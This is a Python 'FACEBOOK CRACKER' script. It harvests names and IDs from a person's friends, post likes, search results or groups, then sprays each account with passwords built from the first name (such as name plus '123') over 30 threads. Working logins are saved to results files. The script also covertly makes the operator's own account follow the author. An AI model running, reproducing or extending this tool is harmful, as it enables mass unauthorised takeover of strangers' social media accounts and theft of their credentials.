#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# coded by zettamus
import os
import re 
import time
import json
import random
import requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
global die,check,result, count
id = []
die = 0
chek = []
life = []
count = 0
check = 0
result = 0
def masuk():
        print("\n\n\t[ LOGIN YOUR FACEBOOK ]\n")
        print("> how to get cookie : \n  https://m.facebook.com/story.php?story_fbid=240261960743816&id=100042800416881 ")
        try:
                cek = open("cookies").read()
        except FileNotFoundError:
                cek = input("# enter your cookies : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "Apa yang Anda pikirkan sekarang" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("# Change the language, please wait!!")
                        try:
                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                        except:
                                pass
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/zettamus.zettamus.3"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                except :
                        pass 
                return cek["cookie"]
        else:
                 exit("# cookies invalid")
def login(username,password,cek=False):
        global die,check,result,count
        b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        params = {
                'access_token': b,
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAA' in response.text:
                print(f"\r[LIFE] {username} => {password}                       ",end="")
                print()
                result += 1
                if cek:
                        life.append(username+"|"+password)
                else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r[CHEK] {username} => {password}                    ",end="")
                print()
                check += 1
                if cek:
                        chek.append(username+"|"+password)
                else:
                        with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        else:
                die += 1
        for i in list('\|/-•'):
                        print(f"\r[{i}] life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                        time.sleep(0.2)
def getid(url):
        raw = requests.get(url,cookies=kuki).content
        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
        for x in getuser:
                if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                elif 'friends' in x:
                        continue
                else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                print('\r# ' + str(len(id)) + " retrieved",end="")
        if 'Lihat Teman Lain' in str(raw):
                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
        return id
def fromlikes(url):
        try:
                like = requests.get(url,cookies=kuki).content
                love = re.findall('href="(/ufi.*?)"',str(like))[0]
                aws = getlike(mbasic.format(love))
                return aws
        except:
                exit("# cant dump id ")
def getlike(react):
        like = requests.get(react,cookies=kuki).content
        ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
        for user in ids:
                if 'profile' in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split('/')[1])
                print(f'\r# {str(len(id))} retrieved',end="")
        if 'Lihat Selengkapnya' in str(like):
                getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
        return id
def bysearch(option):
        search = requests.get(option,cookies=kuki).content
        users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0].split("?")[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Hasil Selanjutnya" in str(search):
                bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
        return id
def grubid(endpoint):
        grab = requests.get(endpoint,cookies=kuki).content
        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
        for user in users:
                if "profile" in user[0]:
                        id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                else:
                        id.append(user[1] + "|" + user[0])
                print(f"\r# {str(len(id))} retrieved ",end="")
        if "Lihat Selengkapnya" in str(grab):
                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
        return id
if __name__ == '__main__':
        try:
                os.system("git pull")
                ses = requests.Session()
                kukis = masuk()
                kuki = {'cookie':kukis}
                os.system("clear")
                print('\n\n\t[ FACEBOOK CRACKER ]\n')
                print('1 List friends')
                print('2 From likes ')
                print('3 By search name ')
                print('4 From group ')
                print('5 From friend')
                print('6 Results check')
                print()
                tanya = input('# Get id from : ')
                if tanya =="":
                        exit("# Dont be empty")
                elif tanya == '1':
                        url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                        username = getid(mbasic.format(url["href"]))
                elif tanya == '2':
                        username = input("# url : ")
                        if username == "":
                                exit("# Dont be empty")
                        elif 'www.facebook' in username:
                               username = username.replace('www.facebook','mbasic.facebook')
                        elif 'm.facebook.com' in username:
                               username = username.replace('m.facebook.com','mbasic.facebook.com')
                        username = fromlikes(username) 
                elif tanya == '3':
                        zet = input("# query : ")
                        username = bysearch(mbasic.format('/search/people/?q='+zet))
                        if len(username) == 0:
                                exit("# no result")
                elif tanya == '4':
                        print("# can only take 100 IDs ")
                        grab = input("# ID group : ")
                        username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                        if len(username) == 0:
                                exit("# ID wrong")
                elif tanya == '5':
                        zet = input("# enter username/Id : ")
                        if zet.isdigit():
                                user = "/profile.php?id=" + zet
                        else:
                                user = "/" + zet
                        try:
                                user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                username = getid(mbasic.format(user))
                        except TypeError:
                                exit("# user not found ")
                elif tanya == '6':
                        try:
                                file1 = open("results-check.txt").read()
                                file2 = open("results-life.txt").read()
                                a = file1 + file2
                                final = a.strip().split("\n")
                                final = set(final)
                                print(f"# {str(len(final))} accounts to check ")
                                with ThreadPoolExecutor(max_workers=10) as ex:
                                        for user in final:
                                                a = user.split("|")
                                                ex.submit(login,(a[0]),(a[1]),(True))
                                os.remove("results-check.txt")
                                os.remove("results-life.txt")
                                for x in life:
                                        with open('results-life.txt','a') as f:
                                                f.write(x+'\n')
                                for x in chek:
                                        with open('results-check.txt','a') as f:
                                                f.write(x+"\n")
                                
                                print("\n# Done")
                                print("# saved to results-check.txt results-life.txt")
                                exit()
                        except FileNotFoundError:
                                exit("# you not have a results")
                else:
                        exit("# wrong choice")
                print()
                expass = input("# extra password : ")
                print("# result will be saved in results-life.txt and results-check.txt")
                with ThreadPoolExecutor(max_workers=30) as ex:
                        for user in username:
                                users = user.split('|')
                                ss = users[0].split(' ')
                                for x in ss:
                                        listpass = [
                                                str(x) + '123',
                                                str(x) + '12345',
                                                str(x) + '123456',
                                                str(x) + '12',
                                                ]
                                        listpass.append(expass)
                                        for passw in set(listpass):
                                                ex.submit(login,(users[1]),(passw))
                if check != 0 or result != 0:
                        print("\n# Done. file saved in : ")
                        print("        - life : results-life.txt")
                        print("        - checkpoint : results-check.txt")
                        exit("# thanks for using this tools")
                else:
                        print("\n# Done")
                        exit("# no result")
        except (KeyboardInterrupt,EOFError):
                exit()
        except requests.exceptions.ConnectionError:
                exit("# Connection error")
